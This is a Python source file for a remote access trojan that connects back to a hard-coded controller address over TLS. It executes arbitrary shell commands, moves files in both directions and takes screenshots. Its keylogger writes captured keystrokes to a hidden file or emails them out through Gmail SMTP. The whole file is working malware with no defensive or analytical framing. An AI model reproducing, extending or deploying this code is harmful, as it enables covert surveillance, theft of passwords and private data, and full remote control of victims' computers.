#!/usr/bin/env python

import socket
import subprocess
import ssl
import json
import os
import base64
import webbrowser
import pyautogui
import time
import pynput.keyboard
import threading
import smtplib


HOST = "192.168.1.103"
PORT = 8080
log = ""
email_address = ""
email_password = ""
cred_check = False
keylogger_method = False
log_started = False
thread_timer = 15
home = ""
command_result = ""
keylog_file_location = "~/sneakyfile.txt"


def check_credentials(email, password):
    global cred_check
    global email_address
    global email_password
    email_address = email
    email_password = password
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_address, email_password)
        server.quit()
        cred_check = True
        return "[+] Email and password accepted."
    except smtplib.SMTPAuthenticationError:
        return "[+] Incorrect user/password. If you're using gmail, remember to allow less secure apps."


def keylogger():
    global log

    def send_email(email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except smtplib.SMTPAuthenticationError:
            pass

    def keylogger_file(keylogdata):
        global home
        home = os.path.expanduser(keylog_file_location)
        if os.path.exists(home):
            append_write = "a"
        else:
            append_write = "w"

        with open(home, append_write) as file:
            file.write(keylogdata)
        subprocess.check_call(["attrib", "+H", home])

    def keypress(key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "

    def report():
        global log
        global email_address
        global email_password
        if log != "":
            if not keylogger_method:
                keylogger_file(log)
            if keylogger_method:
                send_email(email_address, email_password, log)
        log = ""
        timer = threading.Timer(thread_timer, report)
        timer.start()
    with pynput.keyboard.Listener(on_press=keypress) as listener:
        report()
        listener.join()


def connect():
    while True:
        try:
            wrappedConnection.connect((HOST, PORT))
            send_data("Ping")
            time.sleep(1)
            ping = receive_data()
            if ping == "Pong":
                break
        except ConnectionRefusedError:
            time.sleep(300)
            pass


def distraction():
    i = 0
    while i < 696:
        i += 1
    return "Distraction complete"


def change_working_directory(path):
    os.chdir(path)
    return "[+] Changing work directory to " + path


def screenshot():
    pic = pyautogui.screenshot()
    pic.save("screenshot.png")
    screenshot_data = read_file("screenshot.png").decode("utf-8", "ignore")
    return screenshot_data


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def write_file(path, filedata):
    with open(path, "wb") as file:
        file.write(base64.b64decode(filedata))
        return "[+] Upload successful"


def baka_mitai():
    webbrowser.open("https://www.youtube.com/watch?v=7lhJ0LZtv3w")
    return "[+] Baka mitai launched"


def baka(numberoftabs):
    i = 0
    while i < numberoftabs:
        webbrowser.open("https://www.youtube.com/watch?v=7lhJ0LZtv3w", new=1, autoraise=True)
        i += 1
    return "[+] BAKA OVERLOARD"


def open_website(link):
    webbrowser.open(link)
    return "{+] Website " + link + " opened."


def open_website_number(link, tabs):
    i = 0
    while i < tabs:
        webbrowser.open(link, new=1, autoraise=True)
        i += 1
    return "{+] Website " + link + " opened " + str(i) + " times."


def system_command(command):
    try:
        return subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError:
        pass


def receive_data():
    data = b""
    while True:
        part = wrappedConnection.recv(1024)
        data += part
        if len(part) < 1024:
            break
    data = data.decode("utf-8", "ignore")
    return json.loads(data)


def send_data(command_result):
    json_data = json.dumps(command_result)
    wrappedConnection.send(json_data.encode())


funTimes = distraction()
reverseConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
wrappedConnection = ssl.wrap_socket(reverseConnection, ssl_version=ssl.PROTOCOL_TLSv1, server_side=False)
wrappedConnection.settimeout(None)
connect()

while True:
    command = receive_data()
    try:
        if command[0] == "quit":
            wrappedConnection.close()
            exit()

        elif command[0] == "keylogger":
            if len(command) < 2:
                command_result = "Please specify an argument (start, stop, email)"
            elif len(command) == 2:
                thread = threading.Thread(target=keylogger)
                if command[1] == "start":
                    if not keylogger_method:
                        thread.daemon = True
                        thread.start()
                        command_result = "[+] Keylogger started (manual logging)"
                        log_started = True
                    else:
                        if not cred_check:
                            command_result = "[+] Please specify the email and password first (syntax: keylogger email (email@gmail.com) (password)"
                        else:
                            thread.daemon = True
                            thread.start()
                            command_result = "[+] Keylogger started (email)."
                            log_started = True
                elif command[1] == "stop":
                    command_result = "[+] This function is currently under implementation."
                    #thread.join()
                elif command[1] == "download":
                    if not log_started:
                        command_result = "[+] Please start logging first."
                    elif keylogger_method:
                        command_result = "[+] Wrong mode (email) activated, download only applicable with file method."
                    else:
                        try:
                            command_result = read_file(home).decode("utf-8", "ignore")
                        except FileNotFoundError:
                            command_result = "[+] Error. Keylogger file doesn't exist yet!"
                elif command[1] == "method":
                    command_result = "[+] Choose the delivery method (email/file). Syntax: keylogger method (file/email). File is the default. CAN NOT BE CHANGED AFTER KEYLOGGER IS STARTED."
                elif command[1] == "timer":
                    command_result = "[+] Change the frequency of keylogger updates (in seconds). Default is 15 seconds."
                elif command[1] == "delete":
                    if keylogger_method:
                        command_result = "[+] Wrong mode (email)."
                    else:
                        try:
                            home = os.path.expanduser(keylog_file_location)
                            os.remove(home)
                            command_result = "[+] Keylogger file removed."
                        except FileNotFoundError:
                            command_result = "[+] Keylogger file doesn't exist!"
            elif len(command) > 2:
                if command[1] == "email":
                    command_result = check_credentials(command[2], command[3])
                elif command[1] == "method":
                    if command[2] == "file":
                        keylogger_method = False
                        command_result = "[+] Delivery method changed to file."
                    elif command[2] == "email":
                        keylogger_method = True
                        command_result = "[+] Delivery method changed to email."
                    else:
                        command_result = "[+] Incorrect delivery method."
                elif command[1] == "timer":
                    try:
                        timer_value = int(command[2])
                        thread_timer = timer_value
                        command_result = "[+] Thread timer changed to " + str(timer_value) + " seconds."
                    except ValueError:
                        command_result = "[+] Variable is not a whole number."
                else:
                    command_result = "[+] Incorrect syntax."

        elif command[0] == "cd" and len(command) > 1:
            command_result = change_working_directory(command[1])
        elif command[0] == "download":
            command_result = read_file(command[1]).decode("utf-8", "ignore")
        elif command[0] == "bakamitai":
            command_result = baka_mitai()
        elif command[0] == "screenshot":
            command_result = screenshot()
            os.remove("screenshot.png")
        elif command[0] == "BAKA":
            command_result = baka(int(command[1]))
        elif command[0] == "opensite":
            if len(command) == 2:
                command_result = open_website(command[1])
            elif len(command) == 1:
                command_result = "[+] Missing the website link!"
            elif len(command) > 2:
                command_result = open_website_number(command[1], int(command[2]))
        elif command[0] == "upload":
            if len(command) > 3:
                command_result = write_file(command[2], command[-1])
            else:
                command_result = write_file(command[1], command[-1])

        else:
            command_result = system_command(command).decode("utf-8", "ignore")
    except Exception:
        command_result = "[+] Error"

    send_data(command_result)

